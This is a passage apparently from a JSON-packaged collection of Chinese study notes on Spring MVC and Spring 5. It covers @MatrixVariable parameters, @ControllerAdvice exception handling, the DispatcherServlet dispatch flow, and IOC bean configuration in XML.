@MatrixVariable(name=\"color\", pathVar=\"id1\") String color1, @MatrixVariable(name=\"year\", pathVar=\"id1\") String year1,\n  @MatrixVariable(name=\"color\", pathVar=\"id2\") String color2, @MatrixVariable(name=\"year\", pathVar=\"id2\") String year2){}\n\n/*   \n 4. 获取不同路径片段中的参数 \n 请求URI为 /Demo2/color=red;year=2020/pets/77;color=blue;year=2019\n*/ \n@RequestMapping(path=\"/Demo2/{id1}/pets/{id2}\", method=RequestMethod.GET)\npublic String test4(@PathVariable String id2, \n  @MatrixVariable(name=\"color\", pathVar=\"id1\") String color1, @MatrixVariable(name=\"year\", pathVar=\"id1\") String year1,\n  @MatrixVariable(name=\"color\", pathVar=\"id2\") String color2, @MatrixVariable(name=\"year\", pathVar=\"id2\") String year2){}\n/*       \n 5. 通过Map获取所有或指定路径下的所有参数 \n*/              \n@RequestMapping(path=\"/Demo3/{id1}/pets/{id2}\", method=RequestMethod.GET) \npublic String test5(@MatrixVariable Map<String, Object> all, @MatrixVariable(pathVar=\"id1\") Map<String, Object> mapId1) {}\n```\n\n**参数有多个值的玩法**\n若参数值不是单个，那么可以通过两种方式传递：\n- 值之间通过逗号分隔，如dept=321,123\n- 重名name-value对，如dept=321;dept=123\n```java\n/* \n 请求为/Demo1/color=123,321\n 那么color值为123,321\n*/ \n@RequestMapping(path=\"/Demo1/{id}\", method=RequestMethod.GET) \npublic String test1(@MatrixVariable Integer[] color){} \n/*  \n 请求为/Demo1/color=123;color=321 \n 那么color值为123,321 \n*/   \n@RequestMapping(path=\"/Demo1/{id}\", method=RequestMethod.GET)\npublic String test1(@MatrixVariable Integer[] color){}\n```\n\n**那些要注意的坑**\n在参数多值的情况下还有如下3个坑，请各位多加注意：\n- String参数类型可以接受通过逗号和通过重名name-value传递的所有值，而其它类型只能获取第一个值。\n```java\n/*\n 请求为/Demo1/color=123,321\n 那么color值为123,321\n*/  \n@RequestMapping(path=\"/Demo1/{id}\", method=RequestMethod.GET)\npublic String test1(@MatrixVariable String color){\n\n/*    \n 请求为/Demo1/color=123;color=321 \n 那么color值为123,321 \n*/  \n@RequestMapping(path=\"/Demo1/{id}\", method=RequestMethod.GET)\npublic String test1(@MatrixVariable String color){}\n\n/* \n 请求为/Demo1/color=123;color=321 \n 那么color值为123\n*/ \n@RequestMapping(path=\"/Demo1/{id}\", method=RequestMethod.GET)\npublic String test1(@MatrixVariable Integer color){} \n```\n\n- Map<String, Object[]>只能获取参数中的第一个值而已。\n```java\n/*\n 请求为/Demo1/color=123,321\n 那么color值为123 \n*/  \n@RequestMapping(path=\"/Demo1/{id}\", method=RequestMethod.GET)\npublic String test1(@MatrixVariable Map<String, Integer[]> color){} \n```\n\n- 不同路径片段中出现名称相同的参数，那么必须通过pathVar标识所有相同参数所属路径，否则URI匹配失败。\n```java\n// 以下handler仅标识第二个参数的pathVar，而没有标识第一个，那么也是会匹配失败的。\n@RequestMapping(path=\"/Demo2/{id1}/pets/{id2}\", method=RequestMethod.GET)\npublic String test2(@MatrixVariable String color, @MatrixVariable(name=\"color\", pathVar=\"id2\") String color2){}\n```\n\n# @ControllerAdvice注解\n@ControllerAdvice，是Spring3.2提供的新注解,它是一个Controller增强器,可对controller中被 @RequestMapping注解的方法加一些逻辑处理。主要作用有一下三种\n- 通过@ControllerAdvice注解可以将对于控制器的全局配置放在同一个位置。\n- 注解了@ControllerAdvice的类的方法可以使用@ExceptionHandler、@InitBinder、@ModelAttribute注解到方法上。\n  - @ExceptionHandler：用于全局处理控制器里的异常，进行全局异常处理\n  - @InitBinder：用来设置WebDataBinder，用于自动绑定前台请求参数到Model中，全局数据预处理。\n  - @ModelAttribute：本来作用是绑定键值对到Model中，此处让全局的@RequestMapping都能获得在此处设置的键值对 ，全局数据绑定。\n- @ControllerAdvice注解将作用在所有注解了@RequestMapping的控制器的方法上。\n\n## 全局异常处理：\n需要配合@ExceptionHandler使用。\n当将异常抛到controller时,可以对异常进行统一处理,规定返回的json格式或是跳转到一个错误页面\n```java\n/**\n * @ClassName:CustomExceptionHandler\n * @Description: 全局异常捕获\n * @Author: \n * @Date: 2020/5/25、13:38\n */\n@Slf4j\n@RestControllerAdvice //等于@ControllerAdvice与@ResponseBody\npublic class WebControllerAdvice {\n    @ResponseBody\n    @ExceptionHandler\n    public Map errorHandler(Exception ex) {\n        Map errorMap = new HashMap();\n        errorMap.put(\"code\", 400);\n        //判断异常的类型,返回不一样的返回值\n        if (ex instanceof MissingServletRequestParameterException) {\n            errorMap.put(\"msg\", \"缺少必需参数：\" + ((MissingServletRequestParameterException) ex).getParameterName());\n        } else if (ex instanceof MyException) {\n            errorMap.put(\"msg\", \"这是自定义异常\");\n        }\n        return errorMap;\n    }\n```\n自定义异常\n```java\n/**\n * @ClassName:MyException\n * @Description: 定义异常\n * @Author: \n * @Date: 2020/5/25、13:44\n */\npublic class MyException extends RuntimeException {\n    private long code;\n    private String msg;\n\n    public MyException(Long code, String msg) {\n        super(msg);\n        this.code = code;\n        this.msg = msg;\n    }\n    public MyException(String msg) {\n        super(msg);\n        this.msg = msg;\n    }\n}\n```\n测试Controller\n```java\n@RestController\npublic class TestController {\n    @RequestMapping(\"testException\")\n    public String testException() throws Exception{\n        throw new MissingServletRequestParameterException(\"name\",\"String\");\n    }\n\n    @RequestMapping(\"testMyException\")\n    public String testMyException() throws MyException{\n        throw new MyException(\"i am a myException\");\n    }\n```\n测试结果：\n```\n{\"msg\":\"缺少必需参数：name\",\"code\":400}\n{\"msg\":\"这是自定义异常\",\"code\":400}\n```\n## 全局数据绑定\n全局数据绑定功能可以用来做一些初始化的数据操作，我们可以将一些公共的数据定义在添加了 @ControllerAdvice 注解的类中，这样，在每一个 Controller 的接口中，就都能够访问导致这些数据。使用步骤，首先定义全局数据，如下：\n```java\n/**\n * @ClassName:MyGlobalDataHandler\n * @Description: 全局数据\n * @Author: \n * @Date: 2020/5/25、14:01\n */\n@ControllerAdvice\npublic class MyGlobalDataHandler {\n    @ModelAttribute(name = \"md\")\n    public Map<String,Object> getGlobalData(){\n        HashMap<String, Object> map = new HashMap<>();\n        map.put(\"age\", 99);\n        map.put(\"gender\", \"男\");\n        return map;\n    }\n```\n使用 @ModelAttribute 注解标记该方法的返回数据是一个全局数据，默认情况下，这个全局数据的 key 就是返回的变量名，value 就是方法返回值，当然开发者可以通过 @ModelAttribute 注解的 name 属性去重新指定 key。定义完成后，在任何一个Controller 的接口中，都可以获取到这里定义的数据：\n```java\n    @GetMapping(\"/hello\")\n    public String hello(Model model) {\n        Map<String, Object> map = model.asMap();\n        System.out.println(map);\n        int i = 1 / 0;\n        return \"hello controller advice\";\n    }\n```\n运行结果\n```\n{md={gender=男, age=99}}\n2020-05-25 14:04:44.388 - [WARN ] - [org.springframework.web.servlet.handler.AbstractHandlerExceptionResolver:logException:197] - Resolved [java.lang.ArithmeticException: / by zero] \n```\n## 全局数据预处理\n考虑我有两个实体类，Book 和 Author，分别定义如下：\n```java\n@Getter\n@Setter\n@AllArgsConstructor\n@NoArgsConstructor\npublic class Book extends BaseEntity {\n    private String name;\n    private Long price;\n}\n@Getter\n@Setter\n@AllArgsConstructor\n@NoArgsConstructor\npublic class Author  extends BaseEntity {\n    private String name;\n    private Long price;\n}\n```\n如果我定义一个数据添加接口，如下：\n```java\n@PostMapping(\"/book\")\npublic void addBook(Book book, Author author) {\n    System.out.println(book);\n    System.out.println(author);\n}\n```\n这个时候，添加操作就会有问题，因为两个实体类都有一个 name 属性，从前端传递时 ，无法区分。此时，通过 @ControllerAdvice 的全局数据预处理可以解决这个问题\n解决步骤如下:\n1. 给接口中的变量取别名:\n```java\n@PostMapping(\"/book\")\npublic void addBook(@ModelAttribute(\"b\") Book book, @ModelAttribute(\"a\") Author author) {\n    System.out.println(book);\n    System.out.println(author);\n}\n```\n2. 进行请求数据预处理\n在 @ControllerAdvice 标记的类中添加如下代码:\n```java\n@InitBinder(\"b\")\npublic void b(WebDataBinder binder) {\n    binder.setFieldDefaultPrefix(\"b.\");\n}\n@InitBinder(\"a\")\npublic void a(WebDataBinder binder) {\n    binder.setFieldDefaultPrefix(\"a.\");\n}\n```\n`@InitBinder(\"b\")`注解表示该方法用来处理和Book和相关的参数,在方法中,给参数添加一个b前缀,即请求参数要有b前缀.\n3. 发送请求\n请求发送时,通过给不同对象的参数添加不同的前缀,可以实现参数的区分.\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124644.png)\n\n# springmvc请求处理源码\n要想分析springmvc源码，得先从最原始方式来创建Controller类，如下：\n```java\npublic class HelloController implements Controller{\n\t@Override\n\tpublic ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception{\n\t\tModelAndView mv = new ModelAndView();\n\t\tmv.setViewName(\"success\");\n\t\tmv.addObject(\"hello\", \"whz\");\n\t\treturn mv;\n\t}\n}\n```\nweb.xml\n```xml\n<servlet>\n\t<servlet-name>springDespatcherServlet</servlet-name>\n\t<servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n\t<init-param>\n\t\t<param-name>contextConfigLocation</param-name>\n\t\t<param-value>classpath:springmvc.xml</param-value>\n\t</init-param>\n\t<load-on-startup>1</load-on-startup>\n</serlvet>\n\n<servlet-mapping>\n\t<servlet-name>springDispatcherServlet</servlet-name>\n\t<url-pattern>/</url-pattern>\n</servlet-mapping>\n```\n\nspringmvc.xml\n```xml\n<!--\n\t 声明处理器映射器\n\t 目的：选择哪一个处理器来处理当前请求\n -->\n<bean class=\"org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping\"></bean>\n\n<!-- \n\t声明处理器适配器\n\t目的：调用处理器的处理请求的方法\n -->\n<bean class=\"org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter\"></bean>\n\n<!-- \n\t配置视图解析器\n\t目的：处理视图信息\n -->\n<bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\">\n\t<property name=\"prefix\" value=\"/WEB-INF/views/\"></property>\n\t<property name=\"suffix\" value=\".jsp\"></property>\n</bean>\n\n<!-- 声明处理器 -->\n<bean name=\"/helloworld\" class=\"com.baiqi.springmvc.HelloController\"></bean>\n```\n\n流程图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124653.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124704.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124714.png)\n\n**其中上述流程图关键方法位于doDispatch方法**\n```java\n  protected void doDispatch(HttpServletRequest request, HttpServletResponse response) throws Exception {\n    HttpServletRequest processedRequest = request;\n    HandlerExecutionChain mappedHandler = null; // 处理器(Controller)执行链\n    boolean multipartRequestParsed = false;\n    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);\n\n    try {\n      try {\n        ModelAndView mv = null;\n        Object dispatchException = null;\n\n        try {\n\n\t\t\t\t\t//检查是否为文件上传请求\n          processedRequest = this.checkMultipart(request);\n          multipartRequestParsed = processedRequest != request;\n\n\t\t\t\t\t//获取处理当前请求的处理器执行链\n          mappedHandler = this.getHandler(processedRequest);\n\n\t\t\t\t\t//如果处理器执行链为null， 则表明没有Controller能处理当前请求，则会抛异常\n          if (mappedHandler == null) {\n            this.noHandlerFound(processedRequest, response);\n            return;\n          }\n\n\t\t\t\t\t//拿到能执行 处理器中的所有方法 的适配器， 可把这个适配器看成反射工具，通过这个反射工具就可以执行处理器Controller中的所有方法\n          HandlerAdapter ha = this.getHandlerAdapter(mappedHandler.getHandler());\n\n\t\t\t\t\t//获取当前请求的请求方式\n          String method = request.getMethod();\n          boolean isGet = \"GET\".equals(method);\n          if (isGet || \"HEAD\".equals(method)) {\n            long lastModified = ha.getLastModified(request, mappedHandler.getHandler());\n            if ((new ServletWebRequest(request, response)).checkNotModified(lastModified) && isGet) {\n              return;\n            }\n          }\n\n          if (!mappedHandler.applyPreHandle(processedRequest, response)) {\n            return;\n          }\n\n\t\t\t\t\t//通过处理器适配器来调用处理器Controller中的方法\n\t\t\t\t\t//将执行Controller中的方法后的返回值作为mv的view属性值，即作为视图名\n\t\t\t\t\t//所以可以看出，无论Controller中的方法的返回值是什么，最终适配器调用该方法完后，都会将执行完后的信息封装成ModelAndView对象\n          mv = ha.handle(processedRequest, response, mappedHandler.getHandler());\n\n          if (asyncManager.isConcurrentHandlingStarted()) {\n            return;\n          }\n\n\t\t\t\t\t//如果mv中的view属性为空，即视图名为空，则设置默认的视图名\n          this.applyDefaultViewName(processedRequest, mv);\n\n          mappedHandler.applyPostHandle(processedRequest, response, mv);\n\n        } catch (Exception var20) {\n          dispatchException = var20;\n        } catch (Throwable var21) {\n          dispatchException = new NestedServletException(\"Handler dispatch failed\", var21);\n        }\n\n\t\t\t\t//根据获得到的ModelAndView, 跳转到目标页面，而且ModelAndView中的数据可以从请求域中获取\n        this.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);\n      } catch (Exception var22) {\n        this.triggerAfterCompletion(processedRequest, response, mappedHandler, var22);\n      } catch (Throwable var23) {\n        this.triggerAfterCompletion(processedRequest, response, mappedHandler, new NestedServletException(\"Handler processing failed\", var23));\n      }\n\n    } finally {\n      if (asyncManager.isConcurrentHandlingStarted()) {\n        if (mappedHandler != null) {\n          mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);\n        }\n      } else if (multipartRequestParsed) {\n        this.cleanupMultipart(processedRequest);\n      }\n\n    }\n  }\n\n```\ndoDispatch()方法核心过程如下：\n1. 通过getHandler()来获取处理当前请求的处理器执行链\n2. 如果处理器执行链为null， 则表明没有Controller能处理当前请求，则会抛异常\n3. 通过getHandlerAdapter()拿到能执行 处理器中的所有方法 的适配器， 可把这个适配器看成反射工具，通过这个反射工具就可以执行处理器Controller中的所有方法\n4. 通过处理器适配器来调用处理器Controller中的方法， 且获取ModelAndView对象\n5. 根据获得到的ModelAndView, 跳转到目标页面，而且ModelAndView中的数据可以从请求域中获取\n\n## getHandler()细节\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124724.png)\n\n## getHandlerAdater()细节\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124735.png)\n\n## springmvc中的九大组件\nspringmvc中的九大组件指的是DispatcherServlet类中的9个属性，如下：\n```java\n//文件上传解析器\nprivate MultipartResolver multipartResolver;\n\n//区域信息解析器，跟国际化有关\nprivate LocaleResolver localeResolver;\n\n//主题解析器，用来主题效果更换\nprivate ThemeResolver themeResolver;\n\n//处理器映射器\nprivate List<HandlerMapping> handlerMappings;\n\n//处理器适配器\nprivate List<HandlerAdapter> handlerAdapters;\n\n//异常处理解析器\nprivate List<HandlerExceptionResolver> handlerExceptionResolvers;\n\nprivate RequestToViewNameTranslator viewNameTranslator;\n\n//实现springmvc中允许重定向携带数据的功能\nprivate FlashMapManager flashMapManager;\n\n//视图解析器\nprivate List<ViewResolver> viewResolvers;\n```\nspringmvc在工作的时候，关键功能都是由这些组件完成的；\n共同点：九大组件全部都是接口，接口就是规范，提供了强大的扩展性；\n\n### 九大组件初始化\nDispatcherServlet类中的initStrategies()方法用来初始化九大组件\n```java\nprotected void initStrategies(ApplicationContext context) {\n\tthis.initMultipartResolver(context);\n\tthis.initLocaleResolver(context);\n\tthis.initThemeResolver(context);\n\tthis.initHandlerMappings(context);\n\tthis.initHandlerAdapters(context);\n\tthis.initHandlerExceptionResolvers(context);\n\tthis.initRequestToViewNameTranslator(context);\n\tthis.initViewResolvers(context);\n\tthis.initFlashMapManager(context);\n}\n```\n"
  },
  {
    "title": "./notes/back-end/spring5.md",
    "body": "![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124021.png)\n\n# 课程内容介绍\n1. Spring框架概述\n2. IOC容器\n（1）IOC底层原理\n（2）IOC接口（BeanFactory）\n（3）IOC操作Bean管理（基于xml）\n（4）IOC操作Bean管理（基于注解）\n3. Aop\n4. JdbcTemplate\n5. 事务管理\n6. Spring5新特性\n\n# spring5框架概述\n1. Spring是轻量级的开源的JavaEE框架\n2. Spring可以解决企业应用开发的复杂性\n3. Spring有两个核心部分：IOC和Aop\n （1）IOC (inversion of control)：控制反转，把创建对象过程交给Spring进行管理\n （2）Aop (aspect oriented programming)：面向切面，不修改源代码进行功能增强\n4. Spring特点\n（1）方便解耦，简化开发\n（2）Aop编程支持\n（3）方便程序测试\n（4）方便和其他框架进行整合\n（5）方便进行事务操作\n（6）降低API开发难度\n\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124034.png)\n\n# spring入门案例\n1. 创建一个普通类\n```java\npublic class User {\n\tpublic void add(){\n\t\tSystem.out.println(\"add.....\");\n\t}\n}\n```\n2. 创建spring配置文件，在配置文件中配置创建的对象\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n\t   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\t   xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n\t\t\t\t\t\t   http://www.springframework.org/schema/beans/spring-beans.xsd\">\n<!--配置 User 对象创建-->\n\t<bean id=\"user\" class=\"com.atguigu.spring5.User\"></bean>\n</beans>\n```\n\n3. 运行测试代码编写\n```java\n@Test\npublic void testdemo(){\n\t// loading the spring configuration\n\tApplicationContext applicationContext = new ClassPathXmlApplicationContext(\"beam1.xml\");\n\n\t// get the objection created by the spring\n\tUser user = applicationContext.getBean(\"user\", User.class);\n\tuser.add();\n}\n```\n\n# IOC 概念和原理\n1. 什么是 IOC\n（1）控制反转，把对象创建和对象之间的调用过程，交给 Spring 进行管理\n（2）使用 IOC 目的：为了耦合度降低\n（3）以上的入门案例就是 IOC 实现\n2. IOC 底层原理\n（1）xml解析、工厂模式、反射\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124047.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124058.png)\n\n# IOC 接口\n1. IOC思想基于IOC容器完成， IOC容器底层就是对象工厂\n2. Spring提供IOC容器实现两种方式：（两个接口）\n（1）BeanFactory： IOC容器基本实现，是 Spring 内部的使用接口; 加载配置文件时候不会创建对象 ，在获取对象（使用）才去创建对象\n```java\n\tBeanFactory applicationContext = new ClassPathXmlApplicationContext(\"beam1.xml\");//此时不会创建对象\n\tUser user = applicationContext.getBean(\"user\", User.class);//此时才创建对象\n```\n（2）ApplicationContext： BeanFactory 接口的子接口，提供更多更强大的功能，默认情况下加载配置文件时候就会把在配置文件对象进行创建\n```java\n\tApplicationContext applicationContext = new ClassPathXmlApplicationContext(\"beam1.xml\");//此时创建对象\n```\n在实际开发中推荐是用ApplicationContext\n3. ApplicationContext 接口有实现类\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124107.png)\n\n# IOC操作bean管理\n## 概念\n1. 什么是Bean管理\nBean管理指的是两个操作\n（1）Spring 创建对象\n（2）Spirng 注入属性, 即给对象中的变量赋值\n2. Bean 管理操作有两种方式\n（1）基于 xml 配置文件方式实现\n（2）基于注解方式实现\n\n## 基于XML方式\n### 基于 xml 方式创建对象\n```xml\n<bean id=\"user\" class=\"com.atguigu.spring5.User\"></bean>\n```\n（1）在 spring 配置文件中，使用 bean 标签，标签里面添加对应属性，就可以实现对象创建\n（2）在 bean 标签有很多属性，介绍常用的属性\n* id 属性：唯一标识\n* class 属性：类全路径（包类路径）, 不能是接口的\t\n（3）创建对象时候，默认也是执行无参数构造方法完成对象创建, 若类中没有无参构造方法(每个类都会默认有一个无参构造，除非你重写了一个有参构造从而覆盖了无参构造)， 则会报如下错\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124118.png)\n\n### 基于xml方式注入属性\nDI: Dependence injection, 依赖注入, 就是注入属性\n- 第一种注入方式，使用set方法进行注入\n1. 创建类，定义属性和对应的set方法\n```java\npublic class Book {\n\t//创建属性\n\tprivate String bname;\n\tprivate String bauthor;\n\t//创建属性对应的 set 方法\n\tpublic void setBname(String bname) {\n\tthis.bname = bname;\n\t}\n\tpublic void setBauthor(String bauthor) {\n\tthis.bauthor = bauthor;\n\t}\n}\n``` \t\n2. 在 spring 配置文件配置对象创建，配置属性注入\n```xml\n<!--2 set 方法注入属性-->\n<bean id=\"book\" class=\"com.atguigu.spring5.Book\">\n\t<!--使用 property 完成属性注入\n\t\tname：类里面属性名称\n\t\tvalue：向属性注入的值-->\n\t<property name=\"bname\" value=\"易筋经\"></property>\n\t<property name=\"bauthor\" value=\"达摩老祖\"></property>\n</bean>\n```\n\n- set注入方法的简化: p名称空间注入 （了解即可）\n1. 添加p名称空间在配置文件中\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124138.png)\n\n2. 进行属性注入，在 bean 标签里面进行操作\n```xml\n<bean id=\"book\" class=\"com.atguigu.spring5.Book\" p:bname=\"九阳神功\" p:bauthor=\"无名氏\"></bean>\n```\n\n- 第二种注入方式， 使用有参构造进行注入\n1. 创建类，定义属性，创建属性对应有参数构造方法\n```java\npublic class Orders {\n\t//属性\n\tprivate String oname;\n\tprivate String address;\n\t//有参数构造\n\tpublic Orders(String oname,String address) {\n\t\tthis.oname = oname;\n\t\tthis.address = address;\n\t}\n}\n```\n2. 在 spring 配置文件中进行配置\n```xml\n<!--3 有参数构造注入属性-->\n<!-- 如果没有constructor-arg标签，则会默认调用无参构造来创建对象 -->\n<bean id=\"orders\" class=\"com.atguigu.spring5.Orders\">\n\t<constructor-arg name=\"oname\" value=\"电脑\"></constructor-arg>\n\t<constructor-arg name=\"address\" value=\"China\"></constructor-arg>\n</bean>\n```\n\n### 基于xml注入其他类型属性\n1. 字面量\n   - 将属性设置为null\n   ```xml\n   <property name=\"address\">\n\t <null/>\n   </property>\n   ```\n   - 属性值中包含特殊符号\n   ```xml\n   <!-- 情况： 以下情况，编译器会把属性值中的<<>>当中xml标签， 所以会报错 -->\n   <!-- 这种情况是xml文件的通病，解决方法都是一样的 -->\n\t<property name=\"address\" value=\"<<南京>>\">\n\t</property>\n\n\t<!-- 解决方法 -->\n\t<!-- 方法一：将<>特殊字符进行转移  <：&lt  >: &gt -->\n\t<property name=\"address\" value=\"&lt&lt南京&gt&gt\">\n\t</property>\n\n\t<!-- 方法二： 使用CDATA方法，将带符号内容写到CDATA, 这是xml自带的方法 -->\n\t<property name=\"address\">\n\t\t<value><![CDATA[<<南京>>]]></value>\n\t</property>\n   ```\n2. 注入属性-外部bean与内部bean\n内部bean与外部bean都是用于给属性为对象类型的值赋值的情况\n```java\npublic class UserService {\n\t//创建 UserDao 类型属性，生成 set 方法\n\tprivate UserDao userDao;  //userDao类中的有一个userName属性\n\tpublic void setUserDao(UserDao userDao) {\n\t\tthis.userDao = userDao;\n\t}\n\tpublic void add() {\n\t\tSystem.out.println(\"service add...............\");\n\t\tuserDao.update();\n\t}\n}\n```\n- 外部bean方式\n```xml\n<bean id=\"userService\" class=\"com.atguigu.spring5.service.UserService\">\n\t<!--注入 userDao 对象\n\t\tname 属性：类里面属性名称\n\t\tref 属性：创建userDao对象bean标签id值\n\t\t正是因为使用了的ref来创建对象值，所以称为外部bean; 与内部bean相区分\n\t-->\n\t<property name=\"userDao\" ref=\"userDao\"></property>\n\n</bean>\n<bean id=\"userDao\" class=\"com.atguigu.spring5.dao.UserDao\">\n\t<property name=\"userName\" value=\"zhangsan\"></property>\n</bean>\n```\n- 内部bean方式\n```xml\n<bean id=\"userService\" class=\"com.atguigu.spring5.service.UserService\">\n\t<property name=\"userDao\">\n\t\t<bean id=\"userDao\" class=\"com.atguigu.spring5.dao.UserDao\"></bean>\n\t</property>\n\n\t<!-- 给userDao类中的userName赋值, 此时userService类中要有getUserDao()方法，否则会报错，因为底层会调用这个方法来得到userDao; 注：不是级联赋值的情况，不需要设置get方法-->\n\t<!-- 这个就是级联赋值，即给对象内的对象的属性赋值 -->\n\t<!-- 外部bean也是这样用的 -->\n\t<property name=\"userDao.userName\" value=\"zhangsan\"></property>\n</bean>\n```\n \n ### 基于xml注入集合属性\n ```java\npublic class Stu{\n\tprivate String[] courses;\n\tprivate List<String> list;\n\tprivate Map<String, String> maps;\n\tprivate Set<String> sets;\n\t/..set方法../\n}\n ```\n ```xml\n <bean id=\"stu\" class=\"com.atguigu.spring5.Stu\">\n\t<property name=\"courses\">\n\t\t<array>\n\t\t\t<value>java</value>\t\n\t\t\t<value>bigData</value>\t\n\t\t</array>\n\t</property>\n\t<property name=\"list\">\n\t\t<list>\n\t\t\t<value>zhangsan</value>\t\n\t\t\t<value>lishi</value>\t\n\t\t</list>\n\t</property>\n\t<property name=\"maps\">\n\t\t<map>\n\t\t\t<entry key=\"java\" value=\"java\"></entry>\n\t\t\t<entry key=\"php\" value=\"php\"></entry>\n\t\t</map>\n\t</property>\n\t<property name=\"sets\">\n\t\t<set>\n\t\t\t<value>mysql</value>\t\n\t\t\t<value>redis</value>\t\n\t\t</set>\n\t</property>\n</bean>\n ```\n - 在集合里面设置对象类型值\n```java\npublic class Stu1{\n\t// 其中Course为一个类, 含有cname属性\n\tprivate List<Course> courseList; \n\t/..set方法../\n}\n```\n```xml\n<property name=\"courseList\">\n\t<list>\n\t\t<ref bean=\"course1\"></ref>\t\n\t\t<ref bean=\"course2\"></ref>\t\n\t</list>\n</property>\n<bean id=\"course1\" class=\"com.atguigu.spring5.Course\">\n\t<property name=\"cname\" value=\"spring\"></property>\n</bean>\n<bean id=\"course2\" class=\"com.atguigu.spring5.Course\">\n\t<property name=\"cname\" value=\"mybatis\"></property>\n</bean>\n```\n- 把集合注入公共部分提取出来\n先在 spring 配置文件中引入名称空间util\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124150.png)\n\n然后使用 util 标签完成 list 集合注入提取\n```xml\n<!--1 提取 list 集合类型属性注入-->\n<util:list id=\"bookList\">\n\t<value>易筋经</value>\n\t<value>九阴真经</value>\n\t<value>九阳神功</value>\n</util:list>\n\n<!--2 提取 list 集合类型属性注入使用-->\n<bean id=\"book\" class=\"com.atguigu.spring5.collectiontype.Book\">\n\t<property name=\"list\" ref=\"bookList\"></property>\n</bean>\n<bean id=\"book2\" class=\"com.atguigu.spring5.collectiontype.Book\">\n\t<property name=\"list\" ref=\"bookList\"></property>\n</bean>\n```\n\n### FactoryBean\n1. Spring 有两种类型 bean，一种普通bean，另外一种工厂bean（FactoryBean）\n* 普通bean：在配置文件中定义 bean 类型就是返回类型, 上面的例子都是普通bean\n* 工厂bean：在配置文件定义bean类型可以和返回类型不一样; 需要实现spring中自带的FactoryBean接口\n2. 工程bean的实现\n第一步 创建类，让这个类作为工厂bean，实现接口FactoryBean\n第二步 实现接口里面的方法，在实现的方法中定义返回的bean类型\n```java\npublic class MyBean implements FactoryBean<Course>{\n\t//定义返回bean的类型\n\t@Override\n\tpublic Course getObject() throws Exception{\n\t\tCourse course = new Course();\n\t\tcourse.setCname(\"abc\");\n\t\treturn course;\n\t}\n\t@Override\n\tpublic Class<?> getObjectType(){\n\t\treturn null;\n\t}\n\t@Override\n\tpublic boolean isSingleton(){\n\t\treturn false;\n\t}\n}\n```\n```xml\n<bean id=\"myBean\" class=\"com.atguigu.spring5.MyBean\"></bean>\n```\n```java\n@Test\npublic void test(){\n\tApplicationContext context = new ClassPathXmlApplicationContext(\"bean3.xml\");\n\t//虽然spring配置文件中的class是MyBean, 但是返回的是Course, 如果把下面的Course改成MyBean， 则会报Course无法转成MyBean的错误\n\tCourse course = context.getBean(\"myBean\", Course.class);\n}\n```\n\n### bean作用域 \n在 Spring 里面，设置创建bean实例有两种情况，分别是单实例与多实例， 默认情况下， bean是单实例对象\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124219.png)\n\n- 设置单实例或多实例的方法\n（1）在 spring 配置文件 bean 标签里面有属性（ scope）用于设置单实例还是多实例\n（2）scope 属性值\n第一个值 默认值， singleton，表示是单实例对象\n第二个值 prototype，表示是多实例对象\n（3）singleton 和 prototype 区别\n第一 singleton 单实例， prototype 多实例\n第二 设置 scope 值是 singleton 时候，加载 spring 配置文件时候就会创建单实例对象, 设置 scope 值是 prototype 时候，不是在加载 spring 配置文件时候创建 对象，在调用getBean 方法时候创建多实例对象\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124231.png)\n\n### bean生命周期\n（1）通过构造器创建 bean 实例（无参数构造）\n（2）为 bean 的属性设置值和对其他 bean 引用（调用 set 方法）\n（3）如果配置了bean后置处理器,则把bean实例传递bean后置处理器的方法 postProcessBeforeInitialization\n（4）如果配置了初始化方法, 则调用 bean 的初始化的方法\n（5）如果配置了bean后置处理器,把 bean 实例传递bean后置处理器的方法 postProcessAfterInitialization\n（6） bean 可以使用了（对象获取到了）\n（7）如果配置了销毁方法, 则当容器关闭时候，调用 bean 的销毁的方法\n注：一个配置文件中配置了bean后置处理器，则该配置文件中所有的bean创建时都会执行该bean后置处理器方法\n```java\npublic class Orders{\n\tpublic Orders(){\n\t\tSystem.out.println(\"第一步 执行无参数构造创建bean实例\");\n\t}\n\tprivate String oname;\n\tpublic void setOname(String oname){\n\t\tthis.oname = oname;\n\t\tSystem.out.println(\"第二步  调用set方法设置属性值\");\n\t}\n\t//创建执行的初始化的方法\n\tpublic void initMethod(){\n\t\tSystem.out.println(\"第四步  执行初始化的方法\");\n\t}\n\t//创建执行的销毁的方法\n\tpublic void destroyMethod(){\n\t\tSystem.out.println(\"第六步  执行销毁的方法\");\n\t}\n}\n\n\n//创建类，实现接口 BeanPostProcessor，创建后置处理器\npublic class MyBeanPost implements BeanPostProcessor {\n\t@Override\n\tpublic Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {\n\t\tSystem.out.println(\"第三步 在初始化之前执行的方法\");\n\t\treturn bean;\n\t}\n\t@Override\n\tpublic Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException 